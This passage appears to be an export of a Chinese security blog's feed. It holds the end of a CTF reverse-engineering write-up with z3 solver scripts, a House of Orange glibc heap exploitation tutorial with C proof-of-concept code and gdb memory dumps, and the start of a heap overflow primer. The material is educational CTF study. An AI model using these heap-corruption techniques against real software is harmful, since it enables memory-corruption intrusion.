class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">16</span>]==<span class="number">24</span>*v5[<span class="number">16</span>]+<span class="number">78</span>*v5[<span class="number">14</span>]+<span class="number">53</span>*v5[<span class="number">15</span>]+<span class="number">36</span>*v5[<span class="number">17</span>]+<span class="number">86</span>*v5[<span class="number">18</span>]+<span class="number">25</span>*v5[<span class="number">19</span>]+<span class="number">46</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">17</span>]==<span class="number">78</span>*v5[<span class="number">15</span>]+<span class="number">39</span>*v5[<span class="number">14</span>]+<span class="number">52</span>*v5[<span class="number">16</span>]+<span class="number">9</span>*v5[<span class="number">17</span>]+<span class="number">62</span>*v5[<span class="number">18</span>]+<span class="number">37</span>*v5[<span class="number">19</span>]+<span class="number">84</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">18</span>]==<span class="number">48</span>*v5[<span class="number">18</span>]+<span class="number">14</span>*v5[<span class="number">16</span>]+<span class="number">23</span>*v5[<span class="number">14</span>]+<span class="number">6</span>*v5[<span class="number">15</span>]+<span class="number">74</span>*v5[<span class="number">17</span>]+<span class="number">12</span>*v5[<span class="number">19</span>]+<span class="number">83</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">19</span>]==<span class="number">15</span>*v5[<span class="number">19</span>]+<span class="number">48</span>*v5[<span class="number">18</span>]+<span class="number">92</span>*v5[<span class="number">16</span>]+<span class="number">85</span>*v5[<span class="number">15</span>]+<span class="number">27</span>*v5[<span class="number">14</span>]+<span class="number">42</span>*v5[<span class="number">17</span>]+<span class="number">72</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">20</span>]==<span class="number">26</span>*v5[<span class="number">19</span>]+<span class="number">67</span>*v5[<span class="number">17</span>]+<span class="number">6</span>*v5[<span class="number">15</span>]+<span class="number">4</span>*v5[<span class="number">14</span>]+<span class="number">3</span>*v5[<span class="number">16</span>]+<span class="number">68</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">21</span>]==<span class="number">34</span>*v5[<span class="number">24</span>]+<span class="number">12</span>*v5[<span class="number">21</span>]+<span class="number">53</span>*v5[<span class="number">22</span>]+<span class="number">6</span>*v5[<span class="number">23</span>]+<span class="number">58</span>*v5[<span class="number">25</span>]+<span class="number">36</span>*v5[<span class="number">26</span>]+v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">22</span>]==<span class="number">27</span>*v5[<span class="number">25</span>]+<span class="number">73</span>*v5[<span class="number">24</span>]+<span class="number">12</span>*v5[<span class="number">23</span>]+<span class="number">83</span>*v5[<span class="number">21</span>]+<span class="number">85</span>*v5[<span class="number">22</span>]+<span class="number">96</span>*v5[<span class="number">26</span>]+<span class="number">52</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">23</span>]==<span class="number">24</span>*v5[<span class="number">23</span>]+<span class="number">78</span>*v5[<span class="number">21</span>]+<span class="number">53</span>*v5[<span class="number">22</span>]+<span class="number">36</span>*v5[<span class="number">24</span>]+<span class="number">86</span>*v5[<span class="number">25</span>]+<span class="number">25</span>*v5[<span class="number">26</span>]+<span class="number">46</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">24</span>]==<span class="number">78</span>*v5[<span class="number">22</span>]+<span class="number">39</span>*v5[<span class="number">21</span>]+<span class="number">52</span>*v5[<span class="number">23</span>]+<span class="number">9</span>*v5[<span class="number">24</span>]+<span class="number">62</span>*v5[<span class="number">25</span>]+<span class="number">37</span>*v5[<span class="number">26</span>]+<span class="number">84</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">25</span>]==<span class="number">48</span>*v5[<span class="number">25</span>]+<span class="number">14</span>*v5[<span class="number">23</span>]+<span class="number">23</span>*v5[<span class="number">21</span>]+<span class="number">6</span>*v5[<span class="number">22</span>]+<span class="number">74</span>*v5[<span class="number">24</span>]+<span class="number">12</span>*v5[<span class="number">26</span>]+<span class="number">83</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">26</span>]==<span class="number">15</span>*v5[<span class="number">26</span>]+<span class="number">48</span>*v5[<span class="number">25</span>]+<span class="number">92</span>*v5[<span class="number">23</span>]+<span class="number">85</span>*v5[<span class="number">22</span>]+<span class="number">27</span>*v5[<span class="number">21</span>]+<span class="number">42</span>*v5[<span class="number">24</span>]+<span class="number">72</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">27</span>]==<span class="number">26</span>*v5[<span class="number">26</span>]+<span class="number">67</span>*v5[<span class="number">24</span>]+<span class="number">6</span>*v5[<span class="number">22</span>]+<span class="number">4</span>*v5[<span class="number">21</span>]+<span class="number">3</span>*v5[<span class="number">23</span>]+<span class="number">68</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">28</span>]==<span class="number">34</span>*v5[<span class="number">31</span>]+<span class="number">12</span>*v5[<span class="number">28</span>]+<span class="number">53</span>*v5[<span class="number">29</span>]+<span class="number">6</span>*v5[<span class="number">30</span>]+<span class="number">58</span>*v5[<span class="number">32</span>]+<span class="number">36</span>*v5[<span class="number">33</span>]+v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">29</span>]==<span class="number">27</span>*v5[<span class="number">32</span>]+<span class="number">73</span>*v5[<span class="number">31</span>]+<span class="number">12</span>*v5[<span class="number">30</span>]+<span class="number">83</span>*v5[<span class="number">28</span>]+<span class="number">85</span>*v5[<span class="number">29</span>]+<span class="number">96</span>*v5[<span class="number">33</span>]+<span class="number">52</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">30</span>]==<span class="number">24</span>*v5[<span class="number">30</span>]+<span class="number">78</span>*v5[<span class="number">28</span>]+<span class="number">53</span>*v5[<span class="number">29</span>]+<span class="number">36</span>*v5[<span class="number">31</span>]+<span class="number">86</span>*v5[<span class="number">32</span>]+<span class="number">25</span>*v5[<span class="number">33</span>]+<span class="number">46</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">31</span>]==<span class="number">78</span>*v5[<span class="number">29</span>]+<span class="number">39</span>*v5[<span class="number">28</span>]+<span class="number">52</span>*v5[<span class="number">30</span>]+<span class="number">9</span>*v5[<span class="number">31</span>]+<span class="number">62</span>*v5[<span class="number">32</span>]+<span class="number">37</span>*v5[<span class="number">33</span>]+<span class="number">84</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">32</span>]==<span class="number">48</span>*v5[<span class="number">32</span>]+<span class="number">14</span>*v5[<span class="number">30</span>]+<span class="number">23</span>*v5[<span class="number">28</span>]+<span class="number">6</span>*v5[<span class="number">29</span>]+<span class="number">74</span>*v5[<span class="number">31</span>]+<span class="number">12</span>*v5[<span class="number">33</span>]+<span class="number">83</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">33</span>]==<span class="number">15</span>*v5[<span class="number">33</span>]+<span class="number">48</span>*v5[<span class="number">32</span>]+<span class="number">92</span>*v5[<span class="number">30</span>]+<span class="number">85</span>*v5[<span class="number">29</span>]+<span class="number">27</span>*v5[<span class="number">28</span>]+<span class="number">42</span>*v5[<span class="number">31</span>]+<span class="number">72</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">34</span>]==<span class="number">26</span>*v5[<span class="number">33</span>]+<span class="number">67</span>*v5[<span class="number">31</span>]+<span class="number">6</span>*v5[<span class="number">29</span>]+<span class="number">4</span>*v5[<span class="number">28</span>]+<span class="number">3</span>*v5[<span class="number">30</span>]+<span class="number">68</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">35</span>]==<span class="number">34</span>*v5[<span class="number">38</span>]+<span class="number">12</span>*v5[<span class="number">35</span>]+<span class="number">53</span>*v5[<span class="number">36</span>]+<span class="number">6</span>*v5[<span class="number">37</span>]+<span class="number">58</span>*v5[<span class="number">39</span>]+<span class="number">36</span>*v5[<span class="number">40</span>]+v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">36</span>]==<span class="number">27</span>*v5[<span class="number">39</span>]+<span class="number">73</span>*v5[<span class="number">38</span>]+<span class="number">12</span>*v5[<span class="number">37</span>]+<span class="number">83</span>*v5[<span class="number">35</span>]+<span class="number">85</span>*v5[<span class="number">36</span>]+<span class="number">96</span>*v5[<span class="number">40</span>]+<span class="number">52</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">37</span>]==<span class="number">24</span>*v5[<span class="number">37</span>]+<span class="number">78</span>*v5[<span class="number">35</span>]+<span class="number">53</span>*v5[<span class="number">36</span>]+<span class="number">36</span>*v5[<span class="number">38</span>]+<span class="number">86</span>*v5[<span class="number">39</span>]+<span class="number">25</span>*v5[<span class="number">40</span>]+<span class="number">46</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">38</span>]==<span class="number">78</span>*v5[<span class="number">36</span>]+<span class="number">39</span>*v5[<span class="number">35</span>]+<span class="number">52</span>*v5[<span class="number">37</span>]+<span class="number">9</span>*v5[<span class="number">38</span>]+<span class="number">62</span>*v5[<span class="number">39</span>]+<span class="number">37</span>*v5[<span class="number">40</span>]+<span class="number">84</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">39</span>]==<span class="number">48</span>*v5[<span class="number">39</span>]+<span class="number">14</span>*v5[<span class="number">37</span>]+<span class="number">23</span>*v5[<span class="number">35</span>]+<span class="number">6</span>*v5[<span class="number">36</span>]+<span class="number">74</span>*v5[<span class="number">38</span>]+<span class="number">12</span>*v5[<span class="number">40</span>]+<span class="number">83</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">40</span>]==<span class="number">15</span>*v5[<span class="number">40</span>]+<span class="number">48</span>*v5[<span class="number">39</span>]+<span class="number">92</span>*v5[<span class="number">37</span>]+<span class="number">85</span>*v5[<span class="number">36</span>]+<span class="number">27</span>*v5[<span class="number">35</span>]+<span class="number">42</span>*v5[<span class="number">38</span>]+<span class="number">72</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">41</span>]==<span class="number">26</span>*v5[<span class="number">40</span>]+<span class="number">67</span>*v5[<span class="number">38</span>]+<span class="number">6</span>*v5[<span class="number">36</span>]+<span class="number">4</span>*v5[<span class="number">35</span>]+<span class="number">3</span>*v5[<span class="number">37</span>]+<span class="number">68</span>*v5[<span class="number">41</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        res += <span class="built_in">chr</span>(m[v5[i]].as_long())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h3 id="oplog"><a href="#oplog" class="headerlink" title="oplog"></a>oplog</h3><p>丢进反编译器里, 看到smc</p><p>取code[0x20:]重新反编译看到正常solidity代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">r1 = Int(<span class="string">&#x27;r1&#x27;</span>)</span><br><span class="line">r2 = Int(<span class="string">&#x27;r2&#x27;</span>)</span><br><span class="line">r3 = Int(<span class="string">&#x27;r3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m1 = <span class="number">0x88c218df8c5c25674af5808d963bfee9</span></span><br><span class="line">m2 = <span class="number">0xfa8cca1bced017e0ab064d4844c3020b</span></span><br><span class="line">m3 = <span class="number">0xe0ac283049469716cebd61a5b97b8bef</span></span><br><span class="line">s.add(r1 &gt; <span class="number">0</span>)</span><br><span class="line">s.add(r2 &gt; <span class="number">0</span>)</span><br><span class="line">s.add(r3 &gt; <span class="number">0</span>)</span><br><span class="line">s.add(r1 &lt; m1)</span><br><span class="line">s.add(r2 &lt; m2)</span><br><span class="line">s.add(r3 &lt; m3)</span><br><span class="line"></span><br><span class="line">x1 = r1 * <span class="number">0xd062</span> + r2 * <span class="number">0x37b9</span> + r3 * <span class="number">0xcc13</span></span><br><span class="line"></span><br><span class="line">x2 = r1 * <span class="number">0xa4fb</span> + r2 * <span class="number">0xa0a5</span> + r3 * <span class="number">0x2fca</span></span><br><span class="line"></span><br><span class="line">x3 = r1 * <span class="number">0x8f9b</span> + r2 * <span class="number">0x9805</span> + r3 * <span class="number">0xa6a0</span></span><br><span class="line"></span><br><span class="line">mod = <span class="number">0x800000000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">v1 = <span class="number">2357997788534811140333166336809177915724020</span></span><br><span class="line">v2 = <span class="number">94024083436562980853861433269689272115769</span></span><br><span class="line">v3 = <span class="number">7686765725723381031146546660250331403246417</span></span><br><span class="line"></span><br><span class="line">key = (<span class="number">14678491206170330851881690558556870568208252</span> % mod) ^ v1</span><br><span class="line"></span><br><span class="line">s.add((v1 ^ key) == (x1 % mod))</span><br><span class="line">s.add((v2 ^ key) == (x2 % mod))</span><br><span class="line">s.add((v3 ^ key) == (x3 % mod))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line"></span><br><span class="line">r1 = s.model()[r1].as_long()</span><br><span class="line">r2 = s.model()[r2].as_long()</span><br><span class="line">r3 = s.model()[r3].as_long()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == b:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, q = egcd(b, a % b)</span><br><span class="line">    x, y = y, (x - a // b * y)</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span>(<span class="params">pairs</span>):</span></span><br><span class="line">    mod_list, remainder_list = [p[<span class="number">0</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs], [p[<span class="number">1</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs]</span><br><span class="line">    mod_product = reduce(<span class="keyword">lambda</span> x, y: x * y, mod_list)</span><br><span class="line">    mi_list = [mod_product//x <span class="keyword">for</span> x <span class="keyword">in</span> mod_list]</span><br><span class="line">    mi_inverse = [egcd(mi_list[i], mod_list[i])[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mi_list))]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(remainder_list)):</span><br><span class="line">        x += mi_list[i] * mi_inverse[i] * remainder_list[i]</span><br><span class="line">        x %= mod_product</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">val = chinese_remainder([(m1, r1), (m2, r2), (m3, r3)])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(val)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>flag: <code>flag&#123;wuhan_v3r9_g009_s4y_w3jj_8&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of Orange</title>
      <link href="/note-pwn-house-of-orange/"/>
      <url>/note-pwn-house-of-orange/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文学习自CTF-Wiki的<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/">House of Orange</a>, 根据学习情况略有补充和修改</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>House of Orange 与其他的 House of XX 利用方法不同，这种利用方法来自于 Hitcon CTF 2016 中的一道同名题目。由于这种利用方法在此前的 CTF 题目中没有出现过，因此之后出现的一系列衍生题目的利用方法我们称之为 House of Orange</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是题目中<strong>不存在 free 函数或其他释放堆块的函数</strong>。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是<strong>当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中</strong>，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 <code>malloc</code> 的分配需求。 首先我们在程序中的malloc调用会执行到 libc.so 的 <code>_int_malloc</code> 函数中，在<code>_int_malloc</code> 函数中，会依次检验 <code>fastbin</code>、<code>small bins</code>、<code>unsorted bin</code>、<code>large bins</code> 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来 <code>_int_malloc</code> 函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于 <code>mmp_.mmap_threshold</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在 <code>_int_malloc()</code> 函数中会使用 top chunk 分割出 chunk。</p><p>我们总结一下伪造的 top chunk size 的要求</p><ol><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size +<br>MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>这里给出了一个示例程序，程序模拟了一个溢出覆盖到 top chunk 的 size 域。我们试图把 size 改小从而实现 brk 扩展，并把原有的 top chunk 放入 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x41</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size; <span class="comment">// overwrite top chunk size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们把 top chunk 的 size 覆盖为 0x41。之后申请大于这个尺寸的堆块，即 0x60。 但是当我们执行这个示例时会发现，这个程序并不能利用成功，原因在于 assert 并没有被满足从而抛出了异常</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[#0] 0x7ffff7a42428 → Name: __GI_raise(sig=0x6)</span><br><span class="line">[#1] 0x7ffff7a4402a → Name: __GI_abort()</span><br><span class="line">[#2] 0x7ffff7a8a2e8 → Name: __malloc_assert(assertion=0x7ffff7b9e150 &quot;(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&quot;, file=0x7ffff7b9ab85 &quot;malloc.c&quot;, line=0x95a, function=0x7ffff7b9e998 &lt;__func__.11509&gt; &quot;sysmalloc&quot;)</span><br><span class="line">[#3] 0x7ffff7a8e426 → Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20 &lt;main_arena&gt;)</span><br></pre></td></tr></table></figure><h2 id="正确示例"><a href="#正确示例" class="headerlink" title="正确示例"></a>正确示例</h2><p>我们回头来看一下 assert 的条件，可以发现之前列出的条目都被满足了除了第一条。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.伪造的size必须要对齐到内存页</span><br></pre></td></tr></table></figure><p>什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。而 0x40 不满足对齐，因此不能实现利用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x1fe1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行分配之后我们可以观察到原来的堆经过了 brk 扩展</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//原有的堆</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line"></span><br><span class="line">//经过扩展的堆</span><br><span class="line">0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]</span><br></pre></td></tr></table></figure><p>我们的申请被分配到 0x623010 的位置，同时原有的堆被置入 unsorted bin</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] unsorted_bins[0]: fw=0x602020, bk=0x602020</span><br><span class="line"> →   Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure><p>因为 unsorted bin 中存在块，所以我们下次的分配会切割这个块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> malloc(0x60);</span><br><span class="line"> 0x602030</span><br><span class="line"></span><br><span class="line">[+] unsorted_bins[0]: fw=0x602090, bk=0x602090</span><br><span class="line"> →   Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure><p>可以看到分配的内存是从 unsorted bin 中切割的，内存布局如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208 &lt;== 未被清零的unsorted bin链表</span><br><span class="line">0x602040:   0x0000000000602020  0x0000000000602020</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000001f51 &lt;== 切割剩下的新unsorted bin</span><br><span class="line">0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><a href="">CISCN 2020 nofree</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap Overflow</title>
      <link href="/note-pwn-heap-overflow/"/>
      <url>/note-pwn-heap-overflow/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习自<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heapoverflow_basic-zh/">CTF Wiki Heap Overflow</a>, 根据学习情况略有修改</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数(<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>)，因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p><p>堆溢出前提:</p><ul><li>程序向堆上写入数据</li><li>写入的数据大小没有良好地控制</li></ul><p>对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程</p><p>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等)。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p><ol><li>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容<ol><li>prev_size</li><li>size, 主要有三个比特位, 以及该堆块真正的大小<ol><li>NON_MAIN_ARENA</li><li>IS_MAPPED</li><li>PREV_INUSE</li><li>the true chunk size</li></ol></li><li>chunk content, 